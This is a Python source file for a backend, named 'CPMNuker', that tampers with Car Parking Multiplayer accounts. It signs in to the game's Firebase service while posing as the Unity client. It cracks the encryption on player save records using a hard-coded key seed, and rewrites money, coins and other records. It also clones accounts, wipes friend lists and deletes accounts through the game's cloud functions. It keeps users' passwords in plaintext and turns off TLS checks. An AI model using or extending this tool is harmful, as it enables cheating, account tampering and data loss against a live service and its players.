import asyncio
import contextvars
import aiohttp
from aiohttp import web
import json
import re
import random
import secrets
import sqlite3
import time
import struct
import hashlib
import traceback
import logging
import os
import datetime
from copy import deepcopy
from html import escape
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple


try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

try:
    import brotli
    HAS_BROTLI = True
except ImportError:
    HAS_BROTLI = False

import zlib
import base64
import random as _rnd_cars
import requests as _req_cars

# ═══════════════════════════════════════════
#  ⚙️  CONFIG
# ═══════════════════════════════════════════



FK = os.environ.get("FIREBASE_KEY", "").strip()
LOAD_URL = "https://europe-west1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords3"
SAVE_URL = "https://europe-west1-cp-multiplayer.cloudfunctions.net/SavePlayerRecordsPartially8"
RANK_URL = "http://129.146.252.84/inject"

MAX_MONEY = 50_000_000
MAX_COIN  = 500_000

# ═══════════════════════════════════════════
#  📊 LOGGING
# ═══════════════════════════════════════════

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s │ %(levelname)s │ %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("CPM")

# Minimal web backend state. Telegram/admin state is intentionally excluded.
STORE = {"stats": {"total_actions": 0, "total_unlocks": 0}}

def save_store(data):
    return True

def update_daily_stats(key="actions"):
    return True

# ═══════════════════════════════════════════
#  🔐 CRYPTO
# ═══════════════════════════════════════════

def make_xor_key(uid: str) -> bytes:
    chars = list(uid)
    if len(chars) >= 9: chars[1], chars[8] = chars[8], chars[1]
    if len(chars) >= 3: chars.pop(2)
    if len(chars) >= 5: chars.append(chars[4])
    return "".join(chars).encode("utf-8")

def xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

def decompress(data: bytes) -> Optional[bytes]:
    if HAS_BROTLI:
        try: return brotli.decompress(data)
        except: pass
    try: return zlib.decompress(data, zlib.MAX_WBITS | 16)
    except: pass
    try: return zlib.decompress(data)
    except: pass
    return None

def decrypt_aes(data: bytes, key: bytes) -> Optional[bytes]:
    if not HAS_CRYPTO: return None
    try:
        cipher = AES.new(key[:16], AES.MODE_CBC, b"\x00" * 16)
        return unpad(cipher.decrypt(data), 16)
    except: return None

def _md5(t): return hashlib.md5(t.encode()).digest()
def _sha1(t): return hashlib.sha1(t.encode()).digest()[:16]

def build_aes_keys(uid, password=None, email=None):
    keys = [_md5("olzhas_carparking")]
    if password: keys += [_md5(password), _sha1(password)]
    if uid:      keys += [_md5(uid), _sha1(uid)]
    if email:    keys.append(_md5(email))
    return keys


class Reader:
    def __init__(self, data):
        self.buf = data; self.pos = 0

    def has_bytes(self, n): return self.pos + n <= len(self.buf)

    def read_byte(self):
        if not self.has_bytes(1): return 0
        v = self.buf[self.pos]; self.pos += 1; return v

    def read_int(self):
        if not self.has_bytes(4): self.pos = len(self.buf); return 0
        v = struct.unpack_from("<i", self.buf, self.pos)[0]; self.pos += 4; return v

    def read_float(self):
        if not self.has_bytes(4): self.pos = len(self.buf); return 0.0
        v = struct.unpack_from("<f", self.buf, self.pos)[0]; self.pos += 4; return v

    def read_string(self):
        marker = self.read_int()
        if marker in (0, -1): return ""
        length = (-marker) - 1 if marker < -1 else marker
        if marker < -1: self.read_int()
        if length > 1_000_000: length = 1_000_000
        if not self.has_bytes(length): return ""
        text = self.buf[self.pos:self.pos + length].decode("utf-8", errors="replace")
        self.pos += length
        return text.replace("\x00", "").strip()

    def read_list(self, item_fn):
        count = self.read_int()
        if count <= 0 or count > 1_000_000: return []
        result = []
        for _ in range(count):
            if self.pos >= len(self.buf): break
            v = item_fn()
            if v is not None: result.append(v)
        return result

    def read_dict(self):
        count = self.read_int()
        if count <= 0 or count > 1_000_000: return {}
        d = {}
        for _ in range(count):
            if self.pos >= len(self.buf): break
            d[self.read_int()] = self.read_int()
        return d

    def read_equipment(self):
        if self.read_byte() == 0: return None
        return {
            "hair": self.read_list(self.read_int),
            "face": self.read_list(self.read_int),
            "beard": self.read_list(self.read_int),
            "cap": self.read_list(self.read_int),
            "mask": self.read_list(self.read_int),
            "top": self.read_list(self.read_int),
            "gloves": self.read_list(self.read_int),
            "bag": self.read_list(self.read_int),
            "pants": self.read_list(self.read_int),
            "shoes": self.read_list(self.read_int),
            "glasses": self.read_list(self.read_int),
            "SelectedEquipments": self.read_list(self.read_int),
            "Gender": self.read_int(),
        }


def parse_player(buf):
    r = Reader(buf)
    if r.read_byte() == 0: return None
    p = {}
    p["Name"] = r.read_string(); p["money"] = r.read_int()
    p["coin"] = r.read_int(); p["localID"] = r.read_string()
    p["boughtFsos"] = r.read_list(r.read_int)

    def read_friend():
        r.read_byte()
        return {"id": r.read_string(), "Name": r.read_string(), "accountID": r.read_string()}

    p["FriendsID"] = r.read_list(read_friend)
    p["LevelsDoneTime"] = r.read_list(r.read_float)
    p["floats"] = r.read_list(r.read_float)
    p["integers"] = r.read_list(r.read_int)
    p["fcar"] = r.read_list(r.read_int)
    p["favouriteWheels"] = r.read_list(r.read_int)
    p["favouriteVinyls"] = r.read_list(r.read_int)
    p["favouriteEmojis"] = r.read_list(r.read_int)
    p["personEquipmentsMale"] = r.read_equipment()
    p["personEquipmentsFemale"] = r.read_equipment()

    if r.read_byte() == 0:
        p["platesData"] = None
    else:
        def read_vinyl():
            r.read_byte()
            def rv(): return {"x": r.read_float(), "y": r.read_float(), "z": r.read_float()}
            return {"vectors": r.read_list(rv), "v": r.read_list(r.read_string),
                    "floats": r.read_list(r.read_float), "text": r.read_string()}
        def read_plate():
            r.read_byte()
            return {"plateId": r.read_int(), "frontCarId": r.read_int(),
                    "rearCarId": r.read_int(), "vinyls": r.read_list(read_vinyl)}
        p["platesData"] = {"allPlates": r.read_list(read_plate)}

    if r.read_byte() == 0:
        p["carIDnStatus"] = None
    else:
        p["carIDnStatus"] = {
            "carGeneratedIDs": r.read_list(r.read_string),
            "carStatus": r.read_list(r.read_int),
        }

    p["allData"] = r.read_string()
    p["flags"] = r.read_dict()
    p["animations"] = r.read_list(r.read_int)
    p["emojiPacks"] = r.read_list(r.read_int)
    p["wheels"] = r.read_list(r.read_int)
    p["boughtPoliceLights"] = r.read_list(r.read_int)
    p["boughtPoliceSirens"] = r.read_list(r.read_int)
    return p


def try_parse(buf):
    candidates = [buf]
    d1 = decompress(buf)
    if d1:
        candidates.append(d1)
        d2 = decompress(d1)
        if d2: candidates.append(d2)
    for c in candidates:
        if not c: continue
        if len(c) > 0 and c[0] in (17, 23, 24):
            try:
                p = parse_player(c)
                if p and p.get("Name") is not None: return p
            except: pass
        try:
            clean = c[3:] if (len(c) >= 3 and c[0] == 0xef and c[1] == 0xbb) else c
            if clean[0] == 123: return json.loads(clean.decode("utf-8"))
        except: pass
    return None


def decrypt_player_record(base64_text, uid, password=None, email=None):
    try: buf = base64.b64decode(base64_text)
    except: return {"success": False, "message": "Bad base64"}
    if len(buf) < 10: return {"success": False, "message": "Too small"}

    direct = try_parse(buf)
    if direct: return {"success": True, "record": direct}

    if uid:
        try:
            xp = xor_bytes(buf, make_xor_key(uid))
            d  = decompress(xp)
            if d:
                p = try_parse(d)
                if p: return {"success": True, "record": p}
        except: pass

    for key in build_aes_keys(uid or "", password, email):
        plain = decrypt_aes(buf, key)
        if not plain: continue
        p = try_parse(plain)
        if p: return {"success": True, "record": p}

    return {"success": False, "message": "Could not decrypt"}


# ── Writer ────────────────────────────────

class Writer:
    def __init__(self): self._p: List[bytes] = []
    def write_byte(self, v): self._p.append(bytes([v & 0xFF]))
    def write_int(self, v):  self._p.append(struct.pack("<i", int(v or 0)))
    def write_float(self, v): self._p.append(struct.pack("<f", float(v or 0.0)))

    def write_string(self, s):
        if s is None: self._p.append(struct.pack("<i", -1)); return
        s = str(s)
        if s == "": self._p.append(struct.pack("<i", 0)); return
        enc = s.encode("utf-8")
        self._p.append(struct.pack("<ii", -(len(enc)) - 1, len(s)) + enc)

    def write_list(self, lst, fn):
        if lst is None: self._p.append(struct.pack("<i", -1)); return
        self._p.append(struct.pack("<i", len(lst)))
        for item in lst: fn(item)

    def write_equipment(self, data):
        if not data:
            self.write_byte(0)
            return
        self.write_byte(13)
        keys = ("hair","face","beard","cap","mask","top","gloves","bag","pants","shoes","glasses","SelectedEquipments")
        if isinstance(data, dict):
            for k in keys:
                vals = data.get(k, [])
                if not isinstance(vals, list):
                    vals = []
                clean = []
                for v in vals:
                    try: clean.append(int(v))
                    except (TypeError, ValueError): pass
                self.write_list(clean, self.write_int)
            try: gender = int(data.get("Gender", 0) or 0)
            except (TypeError, ValueError): gender = 0
            self.write_int(gender)
            return
        # Unknown legacy representation: emit an empty, structurally valid block.
        for _ in keys:
            self.write_list([], self.write_int)
        self.write_int(0)

    def write_plates(self, data):
        if not data: self.write_byte(0); return
        self.write_byte(1)
        plates = data.get("allPlates", [])
        self._p.append(struct.pack("<i", len(plates)))
        for plate in plates:
            if not isinstance(plate, dict):
                plate = {}
            self.write_byte(4)
            self.write_int(plate.get("plateId", 0))
            self.write_int(plate.get("frontCarId", 0))
            self.write_int(plate.get("rearCarId", 0))
            vinyls = plate.get("vinyls", [])
            self._p.append(struct.pack("<i", len(vinyls)))
            for vinyl in vinyls:
                self.write_byte(4)
                vecs = vinyl.get("vectors", [])
                self._p.append(struct.pack("<i", len(vecs)))
                for vec in vecs:
                    if not isinstance(vec, dict):
                        vec = {}
                    self._p.append(struct.pack("<fff", vec.get("x",0), vec.get("y",0), vec.get("z",0)))
                self.write_list(vinyl.get("v", []), self.write_string)
                self.write_list(vinyl.get("floats", []), self.write_float)
                self.write_string(vinyl.get("text", ""))

    def write_car_id_status(self, data):
        if not data: self.write_byte(0); return
        self.write_byte(2)
        self.write_list(data.get("carGeneratedIDs", []), self.write_string)
        self.write_list(data.get("carStatus", []), self.write_int)

    def to_bytes(self): return b"".join(self._p)


FIELD_MAPPING = [
    (1,"localID"),(2,"money"),(3,"Name"),(4,"coin"),(5,"allData"),
    (6,"boughtFsos"),(7,"boughtPoliceLights"),(8,"boughtPoliceSirens"),
    (9,"FriendsID"),(10,"LevelsDoneTime"),(11,"floats"),(12,"integers"),
    (13,"fcar"),(14,"favouriteWheels"),(15,"favouriteVinyls"),
    (16,"favouriteEmojis"),(18,"emojiPacks"),
    (41,"personEquipmentsMale"),(42,"personEquipmentsFemale"),
    (43,"platesData"),(44,"carIDnStatus"),(45,"flags"),
    (46,"animations"),(48,"wheels"),
]

INT_LIST_FIELDS   = {6,7,8,12,13,14,15,16,18,46,48}
FLOAT_LIST_FIELDS = {10,11}
ALWAYS_SEND       = {"allData"}


def _field_modified(nv, ov):
    if nv is None and ov is None: return False
    if nv is None or ov is None: return True
    if type(nv) != type(ov): return True
    if isinstance(nv, (dict,list)):
        return json.dumps(nv,sort_keys=True) != json.dumps(ov,sort_keys=True)
    return nv != ov


def serialize_field(fid, value):
    w = Writer()
    if fid in (1,3,5): w.write_string(value); return w.to_bytes()
    if fid in (2,4): w.write_int(value or 0); return w.to_bytes()
    if fid == 9:
        friends = value or []
        w._p.append(struct.pack("<i", len(friends)))
        for f in friends:
            w.write_byte(3)
            w.write_string((f or {}).get("id",""))
            w.write_string((f or {}).get("Name",""))
            w.write_string((f or {}).get("accountID",""))
        return w.to_bytes()
    if fid in INT_LIST_FIELDS: w.write_list(value or [], w.write_int); return w.to_bytes()
    if fid in FLOAT_LIST_FIELDS: w.write_list(value or [], w.write_float); return w.to_bytes()
    if fid in (41,42): w.write_equipment(value); return w.to_bytes()
    if fid == 43: w.write_plates(value); return w.to_bytes()
    if fid == 44: w.write_car_id_status(value); return w.to_bytes()
    if fid == 45:
        flags = value or {}
        w._p.append(struct.pack("<i", len(flags)))
        for k, v in flags.items():
            w.write_int(int(k)); w.write_int(int(v))
        return w.to_bytes()
    return None


def build_payload(record, uid, original=None):
    fields = []
    for fid, key in FIELD_MAPPING:
        value = record.get(key)
        if value is None: continue
        if key in ALWAYS_SEND:
            should = isinstance(value, str) and len(value) > 0
        elif original is not None:
            should = _field_modified(value, original.get(key))
        else:
            should = True
        if not should: continue
        raw = serialize_field(fid, value)
        if raw is not None: fields.append((fid, raw))

    parts = [struct.pack("<i", len(fields))]
    for fid, raw in fields:
        parts.append(struct.pack("<hi", fid, len(raw)))
        parts.append(raw)
    combined   = b"".join(parts)
    compressed = brotli.compress(combined) if HAS_BROTLI else zlib.compress(combined)
    encrypted  = xor_bytes(compressed, make_xor_key(uid))
    return base64.b64encode(encrypted).decode("ascii")



# ═══════════════════════════════════════════
#  Native CPM full-record save (mainbotcpm-compatible)
# ═══════════════════════════════════════════

class NativeWriter:
    def __init__(self):
        self._p = []

    def write_byte(self, v):
        self._p.append(bytes([int(v) & 0xFF]))

    def write_int(self, v):
        self._p.append(struct.pack("<i", int(v or 0)))

    def write_float(self, v):
        self._p.append(struct.pack("<f", float(v or 0.0)))

    def write_string(self, s):
        t = str(s).encode("utf-8") if s else b""
        self.write_int(len(t))
        self._p.append(t)

    def write_list(self, lst, fn):
        lst = lst or []
        self.write_int(len(lst))
        for item in lst:
            fn(item)

    def write_dict(self, d):
        # Native parser reads an int key + int value pair.
        d = d or {}
        if not isinstance(d, dict):
            d = {}
        self.write_int(len(d))
        for k, v in d.items():
            try:
                self.write_int(int(k))
            except (TypeError, ValueError):
                self.write_int(0)
            try:
                self.write_int(int(v))
            except (TypeError, ValueError):
                self.write_int(0)

    def write_equipment(self, data):
        # Native parser expects category lists followed by Gender. Accept both
        # the parsed category-dict representation and the flat representation.
        if isinstance(data, dict):
            self.write_byte(13)
            for key in (
                "hair", "face", "beard", "cap", "mask", "top",
                "gloves", "bag", "pants", "shoes", "glasses",
                "SelectedEquipments",
            ):
                values = data.get(key, [])
                if not isinstance(values, list):
                    values = []
                self.write_list(values, self.write_int)
            try:
                gender = int(data.get("Gender", 0) or 0)
            except (TypeError, ValueError):
                gender = 0
            self.write_int(gender)
            return

        # Flat native data is retained for compatibility.
        items = data if isinstance(data, list) else []
        self.write_int(len(items))
        for item in items:
            item = item if isinstance(item, dict) else {}
            t = int(item.get("type", 0) or 0)
            self.write_byte(t)
            if t == 0:
                self.write_int(item.get("id", 0))
                self.write_int(item.get("color", 0))
            elif t == 1:
                self.write_int(item.get("id", 0))
            elif t == 2:
                self.write_int(item.get("id", 0))
                self.write_int(item.get("color", 0))
                self.write_float(item.get("float", 0.0))
            else:
                self.write_int(item.get("id", 0))

    def write_plates(self, data):
        if data is None:
            self.write_byte(0)
            return
        self.write_byte(1)

        def wv(v):
            v = v or {}
            self.write_byte(1)
            self.write_list(
                v.get("vectors", []),
                lambda x: (
                    self.write_float((x or {}).get("x", 0)),
                    self.write_float((x or {}).get("y", 0)),
                    self.write_float((x or {}).get("z", 0)),
                ),
            )
            self.write_list(v.get("v", []), self.write_string)
            self.write_list(v.get("floats", []), self.write_float)
            self.write_string(v.get("text", ""))

        def wp(p):
            p = p or {}
            self.write_byte(1)
            self.write_int(p.get("plateId", 0))
            self.write_int(p.get("frontCarId", 0))
            self.write_int(p.get("rearCarId", 0))
            self.write_list(p.get("vinyls", []), wv)

        self.write_list(data.get("allPlates", []), wp)

    def write_car_id_status(self, data):
        if data is None:
            self.write_byte(0)
            return
        self.write_byte(1)
        self.write_list(data.get("carGeneratedIDs", []), self.write_string)
        self.write_list(data.get("carStatus", []), self.write_int)

    def to_bytes(self):
        return b"".join(self._p)


def native_serialize_player(p):
    """Exact full-record layout used by mainbotcpm.py."""
    w = NativeWriter()
    w.write_byte(1)
    w.write_string(p.get("Name", ""))
    w.write_int(p.get("money", 0))
    w.write_int(p.get("coin", 0))
    w.write_string(p.get("localID", ""))
    w.write_list(p.get("boughtFsos", []), w.write_int)

    def wf(f):
        f = f if isinstance(f, dict) else {}
        w.write_byte(1)
        w.write_string(f.get("id", ""))
        w.write_string(f.get("Name", ""))
        w.write_string(f.get("accountID", ""))

    # FriendsID diserialisasi untuk kompatibilitas tata letak asli; clone_account # menyediakan FriendsID TARGET, bukan FriendsID SUMBER.
    w.write_list(p.get("LevelsDoneTime", []), w.write_float)
    w.write_list(p.get("floats", []), w.write_float)
    w.write_list(p.get("integers", []), w.write_int)
    w.write_list(p.get("fcar", []), w.write_int)
    w.write_list(p.get("favouriteWheels", []), w.write_int)
    w.write_list(p.get("favouriteVinyls", []), w.write_int)
    w.write_list(p.get("favouriteEmojis", []), w.write_int)
    w.write_equipment(p.get("personEquipmentsMale", []))
    w.write_equipment(p.get("personEquipmentsFemale", []))
    w.write_plates(p.get("platesData", None))
    w.write_car_id_status(p.get("carIDnStatus", None))
    w.write_string(p.get("allData", ""))
    w.write_dict(p.get("flags", {}))
    w.write_list(p.get("animations", []), w.write_int)
    w.write_list(p.get("emojiPacks", []), w.write_int)
    w.write_list(p.get("wheels", []), w.write_int)
    w.write_list(p.get("boughtPoliceLights", []), w.write_int)
    w.write_list(p.get("boughtPoliceSirens", []), w.write_int)
    return w.to_bytes()


def equipment_to_native_flat(data):
    """Convert either main.py category data or native data to flat CPM items."""
    if isinstance(data, list):
        return [dict(x) for x in data if isinstance(x, dict)]

    if not isinstance(data, dict):
        return []

    result = []
    seen = set()
    categories = (
        "hair", "face", "beard", "cap", "mask",
        "top", "gloves", "bag", "pants", "shoes", "glasses"
    )
    for category in categories:
        values = data.get(category) or []
        if not isinstance(values, list):
            continue
        for value in values:
            try:
                iid = int(value)
            except (TypeError, ValueError):
                continue
            key = (0, iid, 0)
            if key not in seen:
                seen.add(key)
                result.append({"type": 0, "id": iid, "color": 0})
    return result


async def native_full_save_record(nuker, uid, record):
    """Save using the exact full-record endpoint payload from mainbotcpm.py."""
    ok, msg, auth = await nuker.get_auth(uid)
    if not ok:
        return {"ok": False, "message": msg}

    td = nuker.get_token_data(uid) or {}
    password = td.get("password", "")
    email = td.get("email", "")
    # The bot's uid is the Telegram user ID. CPM's save API expects the
    # Firebase/local account UID returned by sign-in.
    firebase_uid = td.get("firebase_uid", "")
    if not firebase_uid:
        return {"ok": False, "message": "FIREBASE_UID_MISSING"}

    try:
        raw = native_serialize_player(record)
        if not raw:
            return {"ok": False, "message": "NATIVE_SERIALIZE_FAILED"}

        compressed = zlib.compress(raw)
        b64 = base64.b64encode(compressed).decode("ascii")

        payload = {
            "uid": str(firebase_uid),
            "password": password,
            "email": email,
            "fk": FK,
            "base64": b64,
        }

        # Use the same request shape as the known-working full-record save:
        # uid/password/email/fk/base64, without the bot's bearer token header.
        result = await nuker._post(
            SAVE_URL,
            payload,
            GAME_HEADERS,
        )

        # Mainbotcpm's endpoint returns the HTTP body. Treat explicit
        # result=0 / INVALID_ARGUMENT as a real failure.
        if isinstance(result, dict):
            err = result.get("error")
            if err:
                return {"ok": False, "message": f"FULL_SAVE_FAILED:{err}"}
            inner = result.get("result")
            if inner == 0 or inner == "0":
                return {"ok": False, "message": f"FULL_SAVE_FAILED:{result}"}

        return {"ok": True, "message": "Native full save accepted."}

    except Exception as e:
        return {"ok": False, "message": f"NATIVE_FULL_SAVE_ERROR:{e}"}


# ═══════════════════════════════════════════
#  🎮 CPM NUKER
# ═══════════════════════════════════════════

GAME_HEADERS = {
    "Accept": "*/*", "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "User-Agent": "UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
    "X-Unity-Version": "2022.3.62f2",
}



# FULL CLONE: VERIFICATION + AUTO RETRY
CLONE_EXCLUDED_FIELDS = {"FriendsID", "localID"}

def clone_compare_records(source, target):
    source, target = source or {}, target or {}
    return [
        k for k in sorted(set(source) | set(target))
        if k not in CLONE_EXCLUDED_FIELDS and source.get(k) != target.get(k)
    ]

async def clone_with_retry(clone_operation, verify_operation=None,
                           retries=3, retry_delay=2.0):
    retries = max(1, int(retries))
    last = {"ok": False, "message": "CLONE_FAILED", "attempt": 0}
    for attempt in range(1, retries + 1):
        try:
            result = await clone_operation()
            if not isinstance(result, dict):
                result = {"ok": bool(result)}
            last = dict(result)
            last["attempt"] = attempt
            if not result.get("ok"):
                if attempt < retries:
                    await asyncio.sleep(retry_delay * attempt)
                continue
            if verify_operation is None:
                last["verified"] = None
                return last
            verification = await verify_operation()
            if not isinstance(verification, dict):
                verification = {"ok": bool(verification)}
            last["verification"] = verification
            if verification.get("ok"):
                last["verified"] = True
                return last
            if attempt < retries:
                await asyncio.sleep(retry_delay * attempt)
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            last = {
                "ok": False,
                "message": f"CLONE_RETRY_ERROR:{exc}",
                "attempt": attempt,
            }
            if attempt < retries:
                await asyncio.sleep(retry_delay * attempt)
    last["verified"] = False
    return last
    
    
class CPMNuker:
    def __init__(self):
        self.db_path = "cpm_tokens.db"
        self.cache: Dict[str, Dict] = {}
        self._init_db()

    def _init_db(self):
        with sqlite3.connect(self.db_path) as c:
            c.execute("""CREATE TABLE IF NOT EXISTS tokens (
                user_id INTEGER PRIMARY KEY, auth_token TEXT, email TEXT,
                password TEXT, refresh_token TEXT, firebase_uid TEXT,
                token_expires_at REAL)""")
            c.execute("""CREATE TABLE IF NOT EXISTS user_data (
                cache_key TEXT PRIMARY KEY, email TEXT, data_json TEXT)""")
            try: c.execute("ALTER TABLE tokens ADD COLUMN firebase_uid TEXT")
            except: pass
            c.commit()

    def _ck(self, uid, email=None):
        if email: return f"{uid}_{email}"
        td = self.get_token_data(uid)
        return f"{uid}_{td['email']}" if td and td.get("email") else str(uid)

    def save_token(self, uid, auth, email, pw=None, rt=None, fuid=None):
        with sqlite3.connect(self.db_path) as c:
            c.execute("""INSERT OR REPLACE INTO tokens
                (user_id,auth_token,email,password,refresh_token,firebase_uid,token_expires_at)
                VALUES (?,?,?,?,?,?,?)""",
                (uid, auth, email, pw, rt, fuid, time.time()+3600))
            c.commit()

    def get_token_data(self, uid):
        with sqlite3.connect(self.db_path) as c:
            row = c.execute("""SELECT auth_token,email,password,refresh_token,
                firebase_uid,token_expires_at FROM tokens WHERE user_id=?""", (uid,)).fetchone()
        if row:
            return {"auth_token":row[0],"email":row[1],"password":row[2],
                    "refresh_token":row[3],"firebase_uid":row[4],"token_expires_at":row[5]}
        return None

    def get_token(self, uid):
        td = self.get_token_data(uid)
        return {"auth_token":td["auth_token"],"email":td["email"]} if td else None

    def update_token(self, uid, auth, rt=None):
        exp = time.time()+3600
        with sqlite3.connect(self.db_path) as c:
            if rt: c.execute("UPDATE tokens SET auth_token=?,refresh_token=?,token_expires_at=? WHERE user_id=?",(auth,rt,exp,uid))
            else:  c.execute("UPDATE tokens SET auth_token=?,token_expires_at=? WHERE user_id=?",(auth,exp,uid))
            c.commit()

    def delete_token(self, uid):
        with sqlite3.connect(self.db_path) as c:
            c.execute("DELETE FROM tokens WHERE user_id=?",(uid,)); c.commit()
        for k in [k for k in self.cache if k.startswith(str(uid))]:
            del self.cache[k]

    def is_expired(self, uid):
        td = self.get_token_data(uid)
        return not td or not td.get("token_expires_at") or td["token_expires_at"] < time.time()

    def get_record(self, uid, email=None):
        ck = self._ck(uid, email)
        if ck not in self.cache:
            with sqlite3.connect(self.db_path) as c:
                row = c.execute("SELECT data_json FROM user_data WHERE cache_key=?",(ck,)).fetchone()
            if row:
                try: self.cache[ck] = json.loads(row[0])
                except: pass
        return self.cache.get(ck, {})

    def set_record(self, uid, data, email=None):
        ck = self._ck(uid, email)
        self.cache[ck] = data
        with sqlite3.connect(self.db_path) as c:
            c.execute("INSERT OR REPLACE INTO user_data (cache_key,email,data_json) VALUES (?,?,?)",
                      (ck, email, json.dumps(data))); c.commit()

    async def _post(self, url, payload, headers):
        try:
            h = {k:v for k,v in headers.items() if k.lower() != "host"}
            timeout = aiohttp.ClientTimeout(total=30)
            async with aiohttp.ClientSession(timeout=timeout, connector=aiohttp.TCPConnector(ssl=False)) as s:
                async with s.post(url, json=payload, headers=h) as r:
                    text = await r.text()
                    try: return json.loads(text)
                    except: return {"raw": text, "status": r.status}
        except Exception as e:
            log.error(f"HTTP: {e}"); return None

    async def login(self, email, password):
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={FK}"
        h = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
            "User-Agent": "UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
            "X-Unity-Version": "2022.3.62f2"
        }
        p = {
            "email": email,
            "password": password,
            "returnSecureToken": True,
            "clientType": "CLIENT_TYPE_ANDROID"
        }
        try:
            timeout = aiohttp.ClientTimeout(total=30)
            async with aiohttp.ClientSession(timeout=timeout, connector=aiohttp.TCPConnector(ssl=False)) as s:
                async with s.post(url, json=p, headers=h) as resp:
                    text = await resp.text()
                    log.info(f"Login [{resp.status}] {email}: {text[:200]}")
                    try:
                        r = json.loads(text)
                    except:
                        return {"ok": False, "message": "NETWORK_ERROR"}
        except Exception as e:
            log.error(f"Login: {e}")
            return {"ok": False, "message": "NETWORK_ERROR"}

        if "idToken" in r:
            return {
                "ok": True,
                "auth": r["idToken"],
                "refresh_token": r.get("refreshToken", ""),
                "firebase_uid": r.get("localId", "")
            }
        
        err = str(r.get("error", {}).get("message", "")).upper()
        for k in ["EMAIL_NOT_FOUND", "INVALID_PASSWORD", "INVALID_LOGIN_CREDENTIALS", "TOO_MANY_ATTEMPTS", "USER_DISABLED", "INVALID_EMAIL"]:
            if k in err:
                return {"ok": False, "message": k}
        return {"ok": False, "message": f"LOGIN_FAILED: {err[:60]}"}

    async def register(self, email: str, password: str) -> dict:
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={FK}"
        payload = {
            "email": email,
            "password": password,
            "returnSecureToken": True,
            "clientType": "CLIENT_TYPE_ANDROID",
        }
        h = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
            "User-Agent": "UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
            "X-Unity-Version": "2022.3.62f2"
        }

        data = await self._post(url, payload, h)
        if data and data.get("idToken"):
            return {
                "ok": True,
                "message": "SUCCESSFUL",
                "auth": data["idToken"],
                "refresh_token": data.get("refreshToken", ""),
                "firebase_uid": data.get("localId", "")
            }

        err = data.get("error", {}).get("message", "UNKNOWN_ERROR") if isinstance(data, dict) else "UNKNOWN_ERROR"
        return {"ok": False, "message": err, "auth": None}

    async def delete_account(self, uid: int) -> dict:
        """Menghapus akun CPM secara permanen melalui cloud function."""
        ok, msg, auth = await self.get_auth(uid)
        if not ok:
            return {"ok": False, "message": msg}
        
        url = "https://us-central1-cp-multiplayer.cloudfunctions.net/deleteAccountOne"
        headers = {**GAME_HEADERS, "Authorization": f"Bearer {auth}"}
        
        # Menggunakan _post yang sudah ada di CPMNuker
        data = await self._post(url, {"data": None}, headers)
        if data and "result" in data:
            self.delete_token(uid) # Hapus sesi lokal setelah akun terhapus
            return {"ok": True, "message": "SUCCESSFUL"}
        
        err_msg = data.get("error", {}).get("message", "UNKNOWN_ERROR") if isinstance(data, dict) else "UNKNOWN_ERROR"
        return {"ok": False, "message": err_msg}

    async def delete_friends(self, uid: int) -> dict:
        """Menghapus seluruh daftar pertemanan (FriendsID) pada akun."""
        await self.load(uid)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        d = deepcopy(self.get_record(uid, email))
        
        if not d or not d.get("Name"):
            return {"ok": False, "message": "Could not load account data."}
        
        # Kosongkan list FriendsID atau friends
        d["FriendsID"] = []
        if "friends" in d:
            d["friends"] = []
            
        return await self._save(uid, d)

        
    async def _refresh(self, uid):
        td = self.get_token_data(uid)
        if not td: return False,"NO_TOKEN"
        rt,em,pw = td.get("refresh_token"),td.get("email"),td.get("password")
        if rt:
            try:
                timeout = aiohttp.ClientTimeout(total=30)
                async with aiohttp.ClientSession(timeout=timeout, connector=aiohttp.TCPConnector(ssl=False)) as s:
                    async with s.post(f"https://securetoken.googleapis.com/v1/token?key={FK}",
                        json={"grant_type":"refresh_token","refresh_token":rt},
                        headers={"Content-Type":"application/json"}) as resp:
                        r = await resp.json(content_type=None)
                        if r and r.get("id_token"):
                            self.update_token(uid,r["id_token"],r.get("refresh_token",rt))
                            return True,"OK"
            except: pass
        if em and pw:
            res = await self.login(em,pw)
            if res.get("ok"):
                self.save_token(uid,res["auth"],em,pw,res.get("refresh_token",""),res.get("firebase_uid",""))
                return True,"OK"
        return False,"REFRESH_FAILED"

    async def get_auth(self, uid):
        if self.is_expired(uid):
            ok,msg = await self._refresh(uid)
            if not ok: return False,msg,""
        td = self.get_token_data(uid)
        if td and td.get("auth_token"): return True,"OK",td["auth_token"]
        return False,"NO_TOKEN",""

    async def load(self, uid, force=False):
        td = self.get_token_data(uid)
        if not td: return False
        ck = self._ck(uid)
        if not force and ck in self.cache: return True
        ok,msg,auth = await self.get_auth(uid)
        if not ok: return False
        try:
            r = await self._post(LOAD_URL,{"data":None},{**GAME_HEADERS,"Authorization":f"Bearer {auth}"})
            if not r or not r.get("result"): return False
            dec = decrypt_player_record(r["result"],td.get("firebase_uid",""),td.get("password",""),td.get("email",""))
            if dec.get("success") and dec.get("record"):
                self.set_record(uid,dec["record"],td.get("email",""))
                log.info(f"✅ Loaded {uid}: {dec['record'].get('Name')} ${dec['record'].get('money')}")
                return True
            return False
        except Exception as e:
            log.error(f"Load error: {e}"); return False

    def _ok(self, v):
        if v in (1,True): return True
        if v in (0,False): return False
        if isinstance(v,str):
            t=v.strip()
            if t=="1": return True
            if t=="0": return False
            try: return self._ok(json.loads(t))
            except: return False
        if isinstance(v,dict):
            for k in ("result","ok","success"):
                if k in v: return self._ok(v[k])
        return False

